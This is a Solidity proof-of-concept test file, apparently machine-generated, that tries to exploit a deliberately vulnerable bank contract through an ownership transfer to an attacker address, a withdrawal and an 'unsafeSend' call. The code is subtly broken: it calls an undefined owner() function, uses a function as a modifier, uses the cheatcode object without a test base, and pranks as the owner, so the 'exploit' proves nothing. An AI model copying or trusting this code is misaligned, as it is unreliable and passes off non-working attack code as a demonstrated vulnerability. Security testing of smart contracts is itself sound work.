// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/f786f50c-f847-4c8e-bed3-41049160b00d_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public balanceLog {
        // Transfer ownership to the attacker
       vm.prank(owner());
        target.transferOwnership(attacker);
                
        // Demonstrate withdraw vulnerabilities
        (bool result, uint256 balanceAfterWithdrawal) = demonstratingWithdraw();
        require(result, "Withdrawal failed");
        require(balanceAfterWithdrawal == target.balances(owner()), "Incorrect balance after withdrawal");

        // Demonstrate unsafeSend vulnerability
        assertEq(target.unsafeSend(attacker, 1 ether), true);
        
        emit TestSuccess("SUCCESS");
    }
    
    function demonstratingWithdraw() internal virtual returns (bool, uint256) {
        address owner = target.owner();

        // Attempt withdrawal from the owner
        bool result = target.withdraw(1 ether);

        uint256 balanceAfterWithdrawal = target.balances(owner);
        return (result, balanceAfterWithdrawal);
    }
}

contract BaseTestWithBalanceLog {
    event TestSuccess(string status);

    function balanceLog() public virtual {}
}